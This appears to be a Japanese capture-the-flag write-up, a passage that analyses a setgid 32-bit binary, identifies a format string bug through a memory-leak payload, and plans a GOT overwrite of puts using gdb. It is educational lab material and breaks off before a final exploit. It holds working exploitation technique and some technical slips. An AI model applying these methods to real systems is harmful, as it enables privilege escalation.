+<p>　目の前に <code class="language-plaintext highlighter-rouge">flag.txt</code> があるが、ゲストに権限はない。 <code class="language-plaintext highlighter-rouge">q4</code> と言う実行ファイルから <code class="language-plaintext highlighter-rouge">flag.txt</code> の中身を覗くことが出来るのだろう。</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>q4@eceec62b961b ~]<span class="nv">$ </span>file q4
+q4: setgid ELF 32-bit LSB executable, Intel 80386, version 1 <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib/ld-linux.so.2, <span class="k">for </span>GNU/Linux 2.6.18, BuildID[sha1]<span class="o">=</span>526c75e7f0f34744808eb1b09a5a91880562efc8, not stripped
+</code></pre></div></div>
+
+<p>　<code class="language-plaintext highlighter-rouge">q4</code> は 32bit の ELF ファイルのようだ。 <code class="language-plaintext highlighter-rouge">not stripped</code> のためシンボルも生きている。解析してくださいと言わんばかりである。</p>
+
+<p>　ともかく、実行してみよう。</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>q4@eceec62b961b ~]<span class="nv">$ </span>./q4 
+What<span class="s1">'s your name?
+q4
+Hi, q4
+
+Do you want the flag?
+yes
+Do you want the flag?
+yes
+Do you want the flag?
+no
+I see. Good bye.
+</span></code></pre></div></div>
+
+<p>　名前を尋ねられた後、フラグが欲しいかという問いに答える。 何かを入力すると無限ループであり、<code class="language-plaintext highlighter-rouge">no</code> と入力すると終わりのようだった。</p>
+
+<p>　適切な入力を行えば <code class="language-plaintext highlighter-rouge">q4</code> が <code class="language-plaintext highlighter-rouge">flag.txt</code> を読み込んで表示してくれると思われる。</p>
+
+<p>　ただし、適切と言っても、この実行ファイルの脆弱性を突くような文字列が今回の場合は適切な入力と考えて差し支えないだろう。これが <code class="language-plaintext highlighter-rouge">pwn</code> と呼ばれるジャンルである。</p>
+
+<h3 id="セキュリティチェック">セキュリティチェック</h3>
+<p>　実行ファイルに関連するだろうセキュリティのチェックを行う。</p>
+
+<p>　代表的なセキュリティは決まっており、一つ一つ確認してみようと思う。ここでは、私が用意した確認用シェルスクリプトを流す。調査に十分と思うが、適切でない可能性もあるので、各自でもシェルスクリプトが有効かどうかは判断して欲しい。</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>q4@eceec62b961b ~]<span class="nv">$ FILE</span><span class="o">=</span><span class="s2">"q4"</span><span class="p">;</span><span class="se">\</span>
+<span class="o">&gt;</span> <span class="nb">echo</span> <span class="s2">"--- 1: NX"</span><span class="p">;</span>           readelf <span class="nt">-l</span> <span class="nv">$FILE</span> | <span class="nb">grep </span>GNU_STACK<span class="p">;</span><span class="se">\</span>
+<span class="o">&gt;</span> <span class="nb">echo</span> <span class="s2">"--- 2: RELRO"</span><span class="p">;</span>        readelf <span class="nt">-l</span> <span class="nv">$FILE</span> | <span class="nb">grep </span>GNU_RELRO<span class="p">;</span><span class="se">\</span>
+<span class="o">&gt;</span> <span class="nb">echo</span> <span class="s2">"--- 3: Lazy binding"</span><span class="p">;</span> readelf <span class="nt">-d</span> <span class="nv">$FILE</span> | <span class="nb">grep </span>BIND_NOW<span class="p">;</span><span class="se">\</span>
+<span class="o">&gt;</span> <span class="nb">echo</span> <span class="s2">"--- 4: SSP, canary"</span><span class="p">;</span>  readelf <span class="nt">-s</span> <span class="nv">$FILE</span> | <span class="nb">grep</span> <span class="nt">-e</span> __stack_chk_fail <span class="nt">-e</span> __intel_security_cookie<span class="p">;</span><span class="se">\</span>
+<span class="o">&gt;</span> <span class="nb">echo</span> <span class="s2">"--- 5: PIE"</span><span class="p">;</span>  file <span class="nv">$FILE</span> | <span class="nb">grep </span>shared<span class="p">;</span><span class="se">\</span>
+<span class="o">&gt;</span> <span class="nb">echo</span> <span class="s2">"--- 6: ASLR"</span><span class="p">;</span>         sysctl kernel.randomize_va_space | <span class="nb">grep </span>2<span class="p">;</span>
+
+<span class="nt">---</span> 1: NX
+  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x4
+<span class="nt">---</span> 2: RELRO
+<span class="nt">---</span> 3: Lazy binding
+<span class="nt">---</span> 4: SSP, canary
+<span class="nt">---</span> 5: PIE
+<span class="nt">---</span> 6: ASLR
+kernel.randomize_va_space <span class="o">=</span> 2
+</code></pre></div></div>
+
+<p>　セキュリティの状態を表に書き起こすと、</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>セキュリティ</th>
+      <th>状態</th>
+      <th>説明</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>NX</td>
+      <td>〇有効</td>
+      <td>stack, heap領域での実行権限なし</td>
+    </tr>
+    <tr>
+      <td>RELRO</td>
+      <td>✖無効</td>
+      <td>GOT領域への書き込み権限あり</td>
+    </tr>
+    <tr>
+      <td>Lazy Binding</td>
+      <td>〇有効</td>
+      <td>got.plt にて遅延バインディング</td>
+    </tr>
+    <tr>
+      <td>SSP</td>
+      <td>✖無効</td>
+      <td>canary なし</td>
+    </tr>
+    <tr>
+      <td>PIE</td>
+      <td>✖無効</td>
+      <td>text領域等はランダム化されていない</td>
+    </tr>
+    <tr>
+      <td>ASLR</td>
+      <td>〇有効</td>
+      <td>stack, heap領域はランダム化されている</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>　<code class="language-plaintext highlighter-rouge">NX</code> が有効のため、シェルスクリプトを流し込むような手法は使えない。</p>
+
+<p>　<code class="language-plaintext highlighter-rouge">RELRO</code>, <code class="language-plaintext highlighter-rouge">Lazy Binding</code> の状態から、これはいわゆる <code class="language-plaintext highlighter-rouge">no RELRO</code>。GOT領域への書き込み(<code class="language-plaintext highlighter-rouge">GOT overwrite</code>) の可能性を感じる。</p>
+
+<p>　<code class="language-plaintext highlighter-rouge">SSP</code> が無効のため、stack領域におけるリターンアドレスの書き換えも可能性がある。</p>
+
+<p>　<code class="language-plaintext highlighter-rouge">PIE</code> が無効のため、コードの任意アドレスにリターンするなどの可能性もある。</p>
+
+<p>　<code class="language-plaintext highlighter-rouge">ASLR</code> が有効のため、stack, heap領域の位置を固定出来ないため、リターンアドレスを書き換えるためには少々手間がかかる。 32bit実行ファイルであることからブルートフォースによる攻略も考えられる。</p>
+
+<p>　以上が今回対峙することになるだろうセキュリティの状態である。</p>
+
+<h3 id="脆弱性の探索">脆弱性の探索</h3>
+
+<p>　実行ファイルに内在する脆弱性を探す。CTFとなれば大抵何かしらの脆弱性が隠れているものである。</p>
+
+<p>　脆弱性を当てずっぽうで探し当てても良いだろうし、挙動から推察しても良いのだが、今回は逆アセンブルする。</p>
+
+<p>　アセンブリを読むのは今回が実質初めてである。分かった範囲でC言語風に1行ずつコメントを付けた。参考にして欲しい。変数名やラベル名は私が好きにつけているので好きにしてほしい。</p>
+
+<p>　特に <code class="language-plaintext highlighter-rouge">main</code> 関数について逆アセンブル( <code class="language-plaintext highlighter-rouge">objdumpt -d</code> した結果を示す。</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>q4@eceec62b961b ~]<span class="nv">$ </span>objdump <span class="nt">-d</span> q4
+
+q4:     file format elf32-i386
+
+Disassembly of section .init:
+ ...
+
+ ...
+ 80485b3:       c3                      ret
+
+080485b4 &lt;main&gt;:
+ 80485b4:       55                      push   %ebp
+ 80485b5:       89 e5                   mov    %esp,%ebp
+ 80485b7:       83 e4 f0                and    <span class="nv">$0xfffffff0</span>,%esp
+ 80485ba:       81 ec 20 04 00 00       sub    <span class="nv">$0x420</span>,%esp                  <span class="c"># main関数内の変数（引数, ???, ローカル変数）の合計は 0x420 byte</span>
+ 80485c0:       c7 04 24 a4 87 04 08    movl   <span class="nv">$0x80487a4</span>,<span class="o">(</span>%esp<span class="o">)</span>            <span class="c">#   引数1 "What's your name?"</span>
+ 80485c7:       e8 f8 fe ff ff          call   80484c4 &lt;puts@plt&gt;           <span class="c"># puts("What's your name?")</span>
+ 80485cc:       a1 04 9a 04 08          mov    0x8049a04,%eax               <span class="c">#   引数3 stdin</span>
+ 80485d1:       89 44 24 08             mov    %eax,0x8<span class="o">(</span>%esp<span class="o">)</span>
+ 80485d5:       c7 44 24 04 00 04 00    movl   <span class="nv">$0x400</span>,0x4<span class="o">(</span>%esp<span class="o">)</span>             <span class="c">#   引数2 0x400 = 1024</span>
+ 80485dc:       00
+ 80485dd:       8d 44 24 18             lea    0x18<span class="o">(</span>%esp<span class="o">)</span>,%eax              <span class="c">#   引数1 char input[400]</span>
+ 80485e1:       89 04 24                mov    %eax,<span class="o">(</span>%esp<span class="o">)</span>
+ 80485e4:       e8 9b fe ff ff          call   8048484 &lt;fgets@plt&gt;          <span class="c"># fgets(input, 1024, stdin)</span>
+ 80485e9:       c7 04 24 b6 87 04 08    movl   <span class="nv">$0x80487b6</span>,<span class="o">(</span>%esp<span class="o">)</span>            <span class="c">#   引数1 "Hi, "</span>
+ 80485f0:       e8 bf fe ff ff          call   80484b4 &lt;<span class="nb">printf</span>@plt&gt;         <span class="c"># printf("Hi, ")</span>
+ 80485f5:       8d 44 24 18             lea    0x18<span class="o">(</span>%esp<span class="o">)</span>,%eax              <span class="c">#   引数1 char input[400]</span>
+ 80485f9:       89 04 24                mov    %eax,<span class="o">(</span>%esp<span class="o">)</span>
+ 80485fc:       e8 b3 fe ff ff          call   80484b4 &lt;<span class="nb">printf</span>@plt&gt;         <span class="c"># printf(input)</span>
+ 8048601:       c7 04 24 0a 00 00 00    movl   <span class="nv">$0xa</span>,<span class="o">(</span>%esp<span class="o">)</span>                  <span class="c">#   引数1 "\n"</span>
+ 8048608:       e8 67 fe ff ff          call   8048474 &lt;putchar@plt&gt;        <span class="c"># putchar("\n")</span>
+ 804860d:       c7 84 24 18 04 00 00    movl   <span class="nv">$0x1</span>,0x418<span class="o">(</span>%esp<span class="o">)</span>             <span class="c"># int canFlag = 1</span>
+                                                                            <span class="c"># ↑ 後の動きも加味して適当に変数名をつけている</span>
+ 8048614:       01 00 00 00
+ 8048618:       eb 67                   jmp    8048681 &lt;main+0xcd&gt;          <span class="c"># goto FLAG</span>
+
+ 804861a:       c7 04 24 bb 87 04 08    movl   <span class="nv">$0x80487bb</span>,<span class="o">(</span>%esp<span class="o">)</span>    <span class="c"># LOOP: #   引数1 "Do you want the flag?"</span>
+ 8048621:       e8 9e fe ff ff          call   80484c4 &lt;puts@plt&gt;           <span class="c"># puts("Do you want the flag?")</span>
+ 8048626:       a1 04 9a 04 08          mov    0x8049a04,%eax               <span class="c">#   引数3 stdin</span>
+ 804862b:       89 44 24 08             mov    %eax,0x8<span class="o">(</span>%esp<span class="o">)</span>
+ 804862f:       c7 44 24 04 00 04 00    movl   <span class="nv">$0x400</span>,0x4<span class="o">(</span>%esp<span class="o">)</span>             <span class="c">#   引数2 0x400 = 1024</span>
+ 8048636:       00
+ 8048637:       8d 44 24 18             lea    0x18<span class="o">(</span>%esp<span class="o">)</span>,%eax              <span class="c">#   引数1 char input[400]</span>
+ 804863b:       89 04 24                mov    %eax,<span class="o">(</span>%esp<span class="o">)</span>
+ 804863e:       e8 41 fe ff ff          call   8048484 &lt;fgets@plt&gt;          <span class="c"># fgets(input, 1024, stdin)</span>
+ 8048643:       85 c0                   <span class="nb">test</span>   %eax,%eax
+ 8048645:       0f 94 c0                sete   %al
+ 8048648:       84 c0                   <span class="nb">test</span>   %al,%al
+ 804864a:       74 0a                   je     8048656 &lt;main+0xa2&gt;          <span class="c"># goto CMP</span>
+ 804864c:       b8 00 00 00 00          mov    <span class="nv">$0x0</span>,%eax
+ 8048651:       e9 86 00 00 00          jmp    80486dc &lt;main+0x128&gt;         <span class="c"># goto END</span>
+
+ 8048656:       c7 44 24 04 d1 87 04    movl   <span class="nv">$0x80487d1</span>,0x4<span class="o">(</span>%esp<span class="o">)</span> <span class="c"># CMP:  #   引数2 "no"</span>
+ 804865d:       08
+ 804865e:       8d 44 24 18             lea    0x18<span class="o">(</span>%esp<span class="o">)</span>,%eax              <span class="c">#   引数1 char input[400]</span>
+ 8048662:       89 04 24                mov    %eax,<span class="o">(</span>%esp<span class="o">)</span>
+ 8048665:       e8 7a fe ff ff          call   80484e4 &lt;strcmp@plt&gt;         <span class="c"># if(strcmp(input, "no") != 0)</span>
+ 804866a:       85 c0                   <span class="nb">test</span>   %eax,%eax                    <span class="c">#   ↓</span>
+ 804866c:       75 13                   jne    8048681 &lt;main+0xcd&gt;          <span class="c"># goto FLAG</span>
+                                                                            <span class="c"># ↓↓↓↓ ------ else --------- ↓↓↓↓</span>
+ 804866e:       c7 04 24 d5 87 04 08    movl   <span class="nv">$0x80487d5</span>,<span class="o">(</span>%esp<span class="o">)</span>            <span class="c">#   引数1 "I see. Good bye"</span>
+ 8048675:       e8 4a fe ff ff          call   80484c4 &lt;puts@plt&gt;           <span class="c"># puts("I see. Good bye")</span>
+ 804867a:       b8 00 00 00 00          mov    <span class="nv">$0x0</span>,%eax
+ 804867f:       eb 5b                   jmp    80486dc &lt;main+0x128&gt;         <span class="c"># goto END</span>
+                                                                            <span class="c"># ↑↑↑↑ --------------------- ↑↑↑↑</span>
+
+ 8048681:       8b 84 24 18 04 00 00    mov    0x418<span class="o">(</span>%esp<span class="o">)</span>,%eax     <span class="c"># FLAG: # if(canFlag == 1)</span>
+ 8048688:       85 c0                   <span class="nb">test</span>   %eax,%eax                    <span class="c">#   ↓ canFlag(0x418) は 1 に初期化されている</span>
+ 804868a:       0f 95 c0                setne  %al                          <span class="c">#   ↓ 従って必ず式の結果は true</span>
+ 804868d:       84 c0                   <span class="nb">test</span>   %al,%al                      <span class="c">#   ↓ goto LOOP の処理を避けることは出来ない</span>
+ 804868f:       75 89                   jne    804861a &lt;main+0x66&gt;          <span class="c"># goto LOOP</span>
+                                                                            <span class="c"># ↓↓↓↓ flag.txt を読み込んで表示する処理 ↓↓↓↓</span>
+ 8048691:       c7 44 24 04 e6 87 04    movl   <span class="nv">$0x80487e6</span>,0x4<span class="o">(</span>%esp<span class="o">)</span>         <span class="c">#   引数2 "flag.txt"</span>
+ 8048698:       08
+ 8048699:       c7 04 24 e8 87 04 08    movl   <span class="nv">$0x80487e8</span>,<span class="o">(</span>%esp<span class="o">)</span>            <span class="c">#   引数1 "r"</span>
+ 80486a0:       e8 ff fd ff ff          call   80484a4 &lt;fopen@plt&gt;          <span class="c"># fp = fopen("flag.txt", "r")</span>
+ 80486a5:       89 84 24 1c 04 00 00    mov    %eax,0x41c<span class="o">(</span>%esp<span class="o">)</span>
+ 80486ac:       8b 84 24 1c 04 00 00    mov    0x41c<span class="o">(</span>%esp<span class="o">)</span>,%eax             <span class="c">#   引数3 FILE* fp</span>
+ 80486b3:       89 44 24 08             mov    %eax,0x8<span class="o">(</span>%esp<span class="o">)</span>
+ 80486b7:       c7 44 24 04 00 04 00    movl   <span class="nv">$0x400</span>,0x4<span class="o">(</span>%esp<span class="o">)</span>             <span class="c">#   引数2 0x400 = 1024</span>
+ 80486be:       00
+ 80486bf:       8d 44 24 18             lea    0x18<span class="o">(</span>%esp<span class="o">)</span>,%eax              <span class="c">#   引数1 char input[400]</span>
+ 80486c3:       89 04 24                mov    %eax,<span class="o">(</span>%esp<span class="o">)</span>
+ 80486c6:       e8 b9 fd ff ff          call   8048484 &lt;fgets@plt&gt;          <span class="c"># fgets(input, 1024, fp)</span>
+ 80486cb:       8d 44 24 18             lea    0x18<span class="o">(</span>%esp<span class="o">)</span>,%eax              <span class="c">#   引数1 char input[400]</span>
+ 80486cf:       89 04 24                mov    %eax,<span class="o">(</span>%esp<span class="o">)</span>
+ 80486d2:       e8 <span class="nb">dd </span>fd ff ff          call   80484b4 &lt;<span class="nb">printf</span>@plt&gt;         <span class="c"># printf(input)</span>
+ 80486d7:       b8 00 00 00 00          mov    <span class="nv">$0x0</span>,%eax
+                                                                            <span class="c"># ↑↑↑↑ ------------------------------- ↑↑↑↑</span>
+
+ 80486dc:       c9                      leave                       <span class="c"># END: # </span>
+ 80486dd:       c3                      ret
+ 80486de:       90                      nop
+ 80486df:       90                      nop
+
+080486e0 &lt;__libc_csu_fini&gt;:
+ ...
+</code></pre></div></div>
+
+<h4 id="canflag0x418">canFlag(0x418)</h4>
+<p>　まず注目すべき点は、どのような入力をしてもフラグを表示してくれそうにないということである。</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code> 8048681:       8b 84 24 18 04 00 00    mov    0x418<span class="o">(</span>%esp<span class="o">)</span>,%eax     <span class="c"># FLAG: # if(canFlag == 1)</span>
+ 8048688:       85 c0                   <span class="nb">test</span>   %eax,%eax                    <span class="c">#   ↓ canFlag(0x418) は 1 に初期化されている</span>
+ 804868a:       0f 95 c0                setne  %al                          <span class="c">#   ↓ 従って必ず式の結果は true</span>
+ 804868d:       84 c0                   <span class="nb">test</span>   %al,%al                      <span class="c">#   ↓ goto LOOP の処理を避けることは出来ない</span>
+ 804868f:       75 89                   jne    804861a &lt;main+0x66&gt;          <span class="c"># goto LOOP</span>
+</code></pre></div></div>
+
+<p>　上記4行で行っているのは <code class="language-plaintext highlighter-rouge">if(canFlag == 1)</code> に相当する処理であり、 <code class="language-plaintext highlighter-rouge">canFlag(0x418)</code> 変数の値は</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code> 804860d:       c7 84 24 18 04 00 00    movl   <span class="nv">$0x1</span>,0x418<span class="o">(</span>%esp<span class="o">)</span>             <span class="c"># int canFlag = 1</span>
+</code></pre></div></div>
+
+<p>　の行で <code class="language-plaintext highlighter-rouge">1</code> に初期化されている（ <code class="language-plaintext highlighter-rouge">804860d</code> アドレスを参考に逆アセンブル結果を見て欲しい。 <code class="language-plaintext highlighter-rouge">LOOP</code> ラベルの直前だ）</p>
+
+<p>　従って、正常な処理フローではこのif文を抜けられず、その後に続く <code class="language-plaintext highlighter-rouge">flag.txt</code> を <code class="language-plaintext highlighter-rouge">fopen()</code> で読み出して <code class="language-plaintext highlighter-rouge">printf()</code> で表示する処理に到達できないことが分かる。</p>
+
+<p>　これこそが、この問題が提示している<strong>謎</strong>である。</p>
+
+<h3 id="fsbformat-string-bug">FSB(Format String Bug)</h3>
+<p>　謎を解く鍵は、このプログラムの持つ脆弱性 <code class="language-plaintext highlighter-rouge">Format String Bug</code> だ。</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code> 80485fc:       e8 b3 fe ff ff          call   80484b4 &lt;<span class="nb">printf</span>@plt&gt;         <span class="c"># printf(input)</span>
+</code></pre></div></div>
+
+<p>　この行こそ脆弱性である。</p>
+
+<p>　<code class="language-plaintext highlighter-rouge">FSB(Format String Bug)</code> は、書式指定可能な関数においてメモリの内容を読み・書きが可能な脆弱性である。今回は <code class="language-plaintext highlighter-rouge">printf</code> 関数であり、正しく使えば何も問題はないのだが。</p>
+
+<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">printf</span><span class="p">(</span><span class="s">"%s"</span><span class="p">,</span> <span class="n">input</span><span class="p">);</span>    <span class="c1">// 脆弱性なし</span>
+<span class="n">printf</span><span class="p">(</span><span class="n">input</span><span class="p">);</span>          <span class="c1">// 脆弱性あり</span>
+</code></pre></div></div>
+
+<p>　<code class="language-plaintext highlighter-rouge">printf</code> 関数の書き方一つで脆弱性を持ってしまう。</p>
+
+<p>　実際に入力して脆弱性を確認してみよう。</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>q4@eceec62b961b ~]<span class="nv">$ </span>./q4
+What<span class="s1">'s your name?
+AAAA,%x,%x,%x,%x,%x,%x,%x
+Hi, AAAA,400,f7cdc580,ffb69918,6,0,41414141,252c7825
+
+Do you want the flag?
+</span></code></pre></div></div>
+
+<p>　<code class="language-plaintext highlighter-rouge">%x</code> は16進数で値を表示する書式トークンであり、見事にメモリの読み出しに成功している。</p>
+
+<p>　<code class="language-plaintext highlighter-rouge">AAAA</code> と言う文字列は16進数表現だと <code class="language-plaintext highlighter-rouge">41414141</code> になり、丁度6番目の <code class="language-plaintext highlighter-rouge">%x</code> に値が出現している。</p>
+
+<p>　このように、書式トークンが機能することこそが脆弱性なのである。</p>
+
+<h4 id="余談">余談</h4>
+<p>　逆アセンブル結果から、main関数で使われる変数の合計は <code class="language-plaintext highlighter-rouge">0x420 byte</code> であることが分かる。</p>
+
+<p>　注意深く変数を拾っていき、<code class="language-plaintext highlighter-rouge">Hi, AAAA,400,f7cdc580,ffb69918,6,0,41414141,252c7825</code> という読み出し結果を合わせると、以下のようになっているのが分かる。</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#   esp + [0x0  ~ 0x3]    --- 引数1 : input</span>
+<span class="c">#   esp + [0x4  ~ 0x7]    --- 引数2 : 0x400</span>
+<span class="c">#   esp + [0x8  ~ 0xB]    --- 引数3 : stdin : f7cdc580</span>
+<span class="c">#   esp + [0xC  ~ 0xF]    --- ？？？？？ : ffb69918</span>
+<span class="c">#   esp + [0x10 ~ 0x13]   --- ？？？？？ : 6</span>
+<span class="c">#   esp + [0x14 ~ 0x17]   --- ？？？？？ : 0</span>
+<span class="c">#   esp + [0x18 ~ 0x417]  --- char input[400] : 41414141, 252c7825, ...</span>
+<span class="c">#   esp + [0x418 ~ 0x41B] --- int canShowFlag = 1 // 4byte</span>
+<span class="c">#   esp + [0x41C ~ 0x41F] --- FILE* fp            // ポインタのため 4byte</span>
+</code></pre></div></div>
+
+<p>　読み出し結果は <code class="language-plaintext highlighter-rouge">esp + 0x4</code> ~ <code class="language-plaintext highlighter-rouge">esp + 0x19</code> までを表示しているわけである。</p>
+
+<p>　<code class="language-plaintext highlighter-rouge">esp + 0x0</code> ~ <code class="language-plaintext highlighter-rouge">esp +0xB</code> までは引数として使われているのだが、 <code class="language-plaintext highlighter-rouge">esp + 0xC</code> ~ <code class="language-plaintext highlighter-rouge">esp + 0x17</code> の領域が何に使われているのかは最後まで不明だった。気になる人は調べてみて欲しい。</p>
+
+<p>　余談は以上である。</p>
+
+<h3 id="攻撃方法の立案">攻撃方法の立案</h3>
+
+<p>　さて、セキュリティと脆弱性について確認した。これで攻撃方法を確定する。今回は、</p>
+
+<ul>
+  <li>セキュリティ: <code class="language-plaintext highlighter-rouge">no RELRO</code></li>
+  <li>脆弱性: <code class="language-plaintext highlighter-rouge">FSB(Format String Bug)</code></li>
+</ul>
+
+<p>　という特徴を利用しようと思う。題して、「<code class="language-plaintext highlighter-rouge">Format String Bug</code> を利用した <code class="language-plaintext highlighter-rouge">GOT overwrite</code>」。</p>
+
+<p>　※ GOT(Global Offset Table)</p>
+
+<h3 id="下準備1-書き換え対象アドレス">下準備1 書き換え対象アドレス</h3>
+
+<p>　<code class="language-plaintext highlighter-rouge">FSB</code> を利用すると任意のメモリの値を書き換えることも出来る。これには <code class="language-plaintext highlighter-rouge">%n</code> <code class="language-plaintext highlighter-rouge">%hc</code> <code class="language-plaintext highlighter-rouge">%hnn</code> といった書式トークンを使う（それぞれ 4byte, 2byte, 1byte の書き込みを実現する）。</p>
+
+<p>　<code class="language-plaintext highlighter-rouge">no RELRO</code> であるため、 <code class="language-plaintext highlighter-rouge">FSB</code> を使って GOT のリターンアドレスを書き換えることが出来る。</p>
+
+<p>　<code class="language-plaintext highlighter-rouge">GOT overwrite</code> の対象となるリターンアドレスだが、今回は <code class="language-plaintext highlighter-rouge">puts</code> 関数のリターンアドレスにしよう。これからそのアドレスを確認する。</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>q4@eceec62b961b ~]<span class="nv">$ </span>gdb <span class="nt">-q</span> q4
+Reading symbols from q4...<span class="o">(</span>no debugging symbols found<span class="o">)</span>...done.
+<span class="o">(</span>gdb<span class="o">)</span> disas main
+Dump of assembler code <span class="k">for function </span>main:
+   0x080485b4 &lt;+0&gt;:     push   %ebp
+   0x080485b5 &lt;+1&gt;:     mov    %esp,%ebp
+   0x080485b7 &lt;+3&gt;:     and    <span class="nv">$0xfffffff0</span>,%esp
+   0x080485ba &lt;+6&gt;:     sub    <span class="nv">$0x420</span>,%esp
+   0x080485c0 &lt;+12&gt;:    movl   <span class="nv">$0x80487a4</span>,<span class="o">(</span>%esp<span class="o">)</span>
+   0x080485c7 &lt;+19&gt;:    call   0x80484c4 &lt;puts@plt&gt;     <span class="c"># breakpoint 1</span>
+   0x080485cc &lt;+24&gt;:    mov    0x8049a04,%eax
+   0x080485d1 &lt;+29&gt;:    mov    %eax,0x8<span class="o">(</span>%esp<span class="o">)</span>
+   0x080485d5 &lt;+33&gt;:    movl   <span class="nv">$0x400</span>,0x4<span class="o">(</span>%esp<span class="o">)</span>
+   0x080485dd &lt;+41&gt;:    lea    0x18<span class="o">(</span>%esp<span class="o">)</span>,%eax
+   0x080485e1 &lt;+45&gt;:    mov    %eax,<span class="o">(</span>%esp<span class="o">)</span>
+   0x080485e4 &lt;+48&gt;:    call   0x8048484 &lt;fgets@plt&gt;
+   0x080485e9 &lt;+53&gt;:    movl   <span class="nv">$0x80487b6</span>,<span class="o">(</span>%esp<span class="o">)</span>
+   0x080485f0 &lt;+60&gt;:    call   0x80484b4 &lt;<span class="nb">printf</span>@plt&gt;
+   0x080485f5 &lt;+65&gt;:    lea    0x18<span class="o">(</span>%esp<span class="o">)</span>,%eax
+   0x080485f9 &lt;+69&gt;:    mov    %eax,<span class="o">(</span>%esp<span class="o">)</span>
+   0x080485fc &lt;+72&gt;:    call   0x80484b4 &lt;<span class="nb">printf</span>@plt&gt;
+   0x08048601 &lt;+77&gt;:    movl   <span class="nv">$0xa</span>,<span class="o">(</span>%esp<span class="o">)</span>
+   0x08048608 &lt;+84&gt;:    call   0x8048474 &lt;putchar@plt&gt;
+   0x0804860d &lt;+89&gt;:    movl   <span class="nv">$0x1</span>,0x418<span class="o">(</span>%esp<span class="o">)</span>
+   0x08048618 &lt;+100&gt;:   jmp    0x8048681 &lt;main+205&gt;
+   0x0804861a &lt;+102&gt;:   movl   <span class="nv">$0x80487bb</span>,<span class="o">(</span>%esp<span class="o">)</span>
+   0x08048621 &lt;+109&gt;:   call   0x80484c4 &lt;puts@plt&gt;     <span class="c"># breakpoint 2</span>
+   0x08048626 &lt;+114&gt;:   mov    0x8049a04,%eax
+   0x0804862b &lt;+119&gt;:   mov    %eax,0x8<span class="o">(</span>%esp<span class="o">)</span>
+   0x0804862f &lt;+123&gt;:   movl   <span class="nv">$0x400</span>,0x4<span class="o">(</span>%esp<span class="o">)</span>
+<span class="nt">--Type</span> &lt;RET&gt; <span class="k">for </span>more, q to quit, c to <span class="k">continue </span>without paging--q
+Quit
+<span class="o">(</span>gdb<span class="o">)</span> b <span class="k">*</span>main+19
+Breakpoint 1 at 0x80485c7
+<span class="o">(</span>gdb<span class="o">)</span> b <span class="k">*</span>main+109
+Breakpoint 2 at 0x8048621
+<span class="o">(</span>gdb<span class="o">)</span> run
+Starting program: /home/q4/q4
+warning: Error disabling address space randomization: Operation not permitted
+Missing separate debuginfos, use: yum debuginfo-install glibc-2.28-127.el8.i686
+warning: Loadable section <span class="s2">".note.gnu.property"</span> outside of ELF segments
+warning: Loadable section <span class="s2">".note.gnu.property"</span> outside of ELF segments
+
+Breakpoint 1, 0x080485c7 <span class="k">in </span>main <span class="o">()</span>
+Missing separate debuginfos, use: yum debuginfo-install libgcc-8.3.1-5.1.el8.i686 libstdc++-8.3.1-5.1.el8.i686
+<span class="o">(</span>gdb<span class="o">)</span> disas 0x80484c4
+Dump of assembler code <span class="k">for function </span>puts@plt:
+   0x080484c4 &lt;+0&gt;:     jmp    <span class="k">*</span>0x80499f4       <span class="c"># GOTアドレス</span>
+   0x080484ca &lt;+6&gt;:     push   <span class="nv">$0x30</span>
+   0x080484cf &lt;+11&gt;:    jmp    0x8048454
+End of assembler dump.
+<span class="o">(</span>gdb<span class="o">)</span> x/xw 0x80499f4                            <span class="c"># 1回目</span>
+0x80499f4 &lt;puts@got.plt&gt;:       0x080484ca  
+<span class="o">(</span>gdb<span class="o">)</span> c
+Continuing.
+What<span class="s1">'s your name?
+hi  
+Hi, hi
+
+
+Breakpoint 2, 0x08048621 in main ()
+(gdb) x/xw 0x80499f4
+0x80499f4 &lt;puts@got.plt&gt;:       0xf7b25140      # 2回目(lazy binding)
+</span></code></pre></div></div>
+
+<ol>
+  <li><code class="language-plaintext highlighter-rouge">puts</code> 関数二つに <code class="language-plaintext highlighter-rouge">breakpoint</code> を打つ</li>
+  <li><code class="language-plaintext highlighter-rouge">run</code></li>
+  <li><code class="language-plaintext highlighter-rouge">disas 0x80484c4</code> によって <code class="language-plaintext highlighter-rouge">puts</code> 関数を逆アセンブル</li>
+  <li>今回書き換えたいのは <code class="language-plaintext highlighter-rouge">0x80499f4</code> である
+    <ol>
+      <li><code class="language-plaintext highlighter-rouge">0x080484c4 &lt;+0&gt;:     jmp    *0x80499f4</code></li>
+    </ol>
+  </li>
+  <li><code class="language-plaintext highlighter-rouge">x/xw 0x80499f4</code> で値を確認
+    <ol>
+      <li><code class="language-plaintext highlighter-rouge">0x80499f4 &lt;puts@got.plt&gt;:       0x080484ca</code></li>
+    </ol>
+  </li>
+  <li>進める</li>
+  <li><code class="language-plaintext highlighter-rouge">x/xw 0x80499f4</code> で値を確認（2回目）
+    <ol>
+      <li><code class="language-plaintext highlighter-rouge">0x80499f4 &lt;puts@got.plt&gt;:       0xf7b25140</code></li>
+      <li><code class="language-plaintext highlighter-rouge">no RELRO</code> は遅延バインディングする。確かに2回目のアドレスが変わっており、遅延バインディングされている。</li>
+    </ol>
+  </li>
+</ol>
+
